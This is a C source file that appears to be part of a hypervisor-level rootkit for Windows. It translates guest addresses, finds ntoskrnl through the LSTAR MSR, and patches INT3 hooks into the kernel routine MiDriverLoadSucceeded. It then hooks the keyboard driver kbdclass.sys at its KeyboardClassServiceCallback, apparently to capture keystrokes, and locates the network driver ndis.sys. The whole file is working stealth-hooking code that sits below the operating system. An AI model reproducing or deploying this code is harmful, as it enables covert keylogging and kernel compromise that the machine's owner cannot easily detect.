#include <hooks/hooking.h>
#include <lib/instr.h>
#include <lib/util.h>


__attribute__((section(".vmm"))) uint64_t guest_virtual_to_physical(uint64_t addr){
    qword_t *pml4 = __vmread(GUEST_CR3), *pml3, *pml2, *pml1;
    qword_t pml4e, pml3e, pml2e, pml1e;

    pml4e = pml4[PML4E_IDX(addr)];
    if (!(pml4e & PAGING_P)) return 0;

    pml3 = pml4e & PAGING_ENTRY_MASK;
    pml3e = pml3[PML3E_IDX(addr)];
    if (!(pml3e & PAGING_P)) return 0;
    if (pml3e & PAGING_PS) return (pml3e & PAGING_ENTRY_MASK) + PAGING_OFFSET_1GB(addr);

    pml2 = pml3e & PAGING_ENTRY_MASK;
    pml2e = pml2[PML2E_IDX(addr)];
    if (!(pml2e & PAGING_P)) return 0;
    if (pml2e & PAGING_PS) return (pml2e & PAGING_ENTRY_MASK) + PAGING_OFFSET_2MB(addr);

    pml1 = pml2e & PAGING_ENTRY_MASK;
    pml1e = pml1[PML1E_IDX(addr)];
    if (!(pml1e & PAGING_P)) return 0;
    return (pml1e & PAGING_ENTRY_MASK) + PAGING_OFFSET_4KB(addr);

}

__attribute__((section(".vmm"))) void hook_function(byte_t *func){
    *func = INT3_OPCODE;
}


__attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){

    // LSTAR is either KiSystemCall64Shadow or KiSystemCall64. Try both.
    if (!((lstar-NTOSKRNL_KiSystemCall64Shadow_OFFSET) & 0xfff))
        shared_cores_data.ntoskrnl = lstar-NTOSKRNL_KiSystemCall64Shadow_OFFSET;
    else if (!((lstar-NTOSKRNL_KiSystemCall64_OFFSET) & 0xfff))
        shared_cores_data.ntoskrnl = lstar-NTOSKRNL_KiSystemCall64_OFFSET;
    else
        LOG_ERROR("FAILED TO FIND NTOSKRNL (LSTAR=%x)\n", lstar);

    LOG_INFO("Found ntoskrnl: %x\n", shared_cores_data.ntoskrnl);

    uint64_t MiDriverLoadSucceeded = shared_cores_data.ntoskrnl + NTOSKRNL_MiDriverLoadSucceeded_OFFSET;
    uint64_t ntoskrnl_phys = guest_virtual_to_physical(shared_cores_data.ntoskrnl);
    uint64_t MiDriverLoadSucceeded_phys = guest_virtual_to_physical(MiDriverLoadSucceeded);
    
    clear_msr_bitmap_write(LSTAR_MSR, shared_cores_data.msr_bitmaps);

    hook_function(MiDriverLoadSucceeded_phys);
}

__attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state){

    // Emulate PUSH RBP
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack);
    *(uint64_t*)guest_stack_phys = state->registers->rbp;

    uint64_t driver = *(uint64_t*)(guest_virtual_to_physical(guest_stack+0x70));

    // Try kbdclass
    uint64_t kbdclass_signature_phys = guest_virtual_to_physical(driver+KBDCLASS_SIGNATURE_OFFSET);
    if (memcmp(kbdclass_signature_phys, "kbdclass.pdb", 13)){
        LOG_INFO("Found kbdclass.sys: %x\n", driver);
        
        shared_cores_data.kbdclass = driver;
        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET));

    }

    if (shared_cores_data.ndis == 0){
        shared_cores_data.ndis = find_windows_module(u"ndis.sys", 16);
        if (shared_cores_data.ndis != 0)
            LOG_INFO("Found ndis.sys: %x\n", shared_cores_data.ndis);
    }

    // Remove the MiDriverLoadSucceeded hook if all drivers were found
    if (shared_cores_data.kbdclass != 0 && shared_cores_data.ndis != 0){
        LOG_DEBUG("Removing MiDriverLoadSucceeded hook\n");
        uint64_t MiDriverLoadSucceeded_phys = guest_virtual_to_physical(__vmread(GUEST_RIP));
        *(uint8_t*)MiDriverLoadSucceeded_phys = PUSH_RBP;
    }

}

__attribute__((section(".vmm"))) uint64_t get_node_dllbase(qword_t node){
    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_DllBase(node));
}

__attribute__((section(".vmm"))) uint16_t get_node_dllname_length(qword_t node){
    return *(uint16_t*)guest_virtual_to_physical(UNICODE_STRING_Length(KLDR_DATA_TABLE_ENTRY_BaseDllName(node)));
}

__attribute__((section(".vmm"))) qword_t get_node_dllname_buffer(qword_t node){
    return guest_virtual_to_physical(*(qword_t*)guest_virtual_to_physical(UNICODE_STRING_Buffer(KLDR_DATA_TABLE_ENTRY_BaseDllName(node))));
}

__attribute__((section(".vmm"))) qword_t get_next_node(qword_t node){
    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_Flink(node));
}

__attribute__((section(".vmm"))) qword_t find_windows_module(wchar_t *name, uint16_t len){

    uint64_t guest_cr3 = __vmread(GUEST_CR3);

    qword_t node = shared_cores_data.ntoskrnl+NTOSKRNL_PsLoadedModuleList_OFFSET;

    while (get_node_dllname_length(node) != len || !memcmp(get_node_dllname_buffer(node), name, len)){
        node = get_next_node(node);
        if (node == shared_cores_data.ntoskrnl+NTOSKRNL_PsLoadedModuleList_OFFSET) return 0;    // Reached end of list
    }

    return get_node_dllbase(node);

}
